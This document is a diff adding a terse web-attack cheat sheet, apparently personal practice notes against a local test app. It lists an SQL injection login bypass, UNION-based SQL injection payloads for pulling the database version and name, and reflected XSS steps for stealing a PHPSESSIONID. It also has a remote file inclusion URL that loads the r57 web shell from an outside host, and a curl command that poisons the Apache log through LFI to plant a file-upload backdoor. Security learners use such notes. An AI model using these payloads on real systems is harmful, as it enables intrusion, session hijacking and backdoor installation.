@@ -1,0 +1,18 @@
+- SQL injection login 
+username: longvt
+passwd: x' or '1'='1
+- SQL injection 
+?id=-1 union select 1,2,3,version(),5,6-- -
+id=-1 union select 1,2,3,database(),5,6-- -
+http://forum.whitehat.vn/threads/threads/5459-Web4-SQL-injection-Cac-buoc-khai-thac.html
+- Reflected XSS:
+Buoc 1 vao crom++
+B2 vao log lay PHPSESSIONID
+- RFI
+http://localhost:8000/WebApp/fileInclusion.php?COLOR=http://www.r57shell.net/shell/r57.txt?
+http://localhost:8000/WebApp/fileInclusion.php?COLOR=http://www.r57shell.net/shell/r57.txt%23
+Note: %22 (“””), %23 (“#”), and %27 (“’”)
+- LFI
+http://localhost:8000/WebApp/index.php?page=C:\xampp\apache\logs\access.log
+
+curl --globoff "http://localhost:8000/WebApp/index.php?page=C:/xampp/apache/logs/access.log <?php if (isset($_GET['upload'])) {move_uploaded_file($_FILES['file']['tmp_name'], 'backdoor.php');}?><form action='index.php?page=C:/xampp/apache/logs/access.log&upload=1' method='POST' enctype='multipart/form-data'><input type='file' name='file' value='file'/><input type='submit' name='submit' value='submit' /></form>"
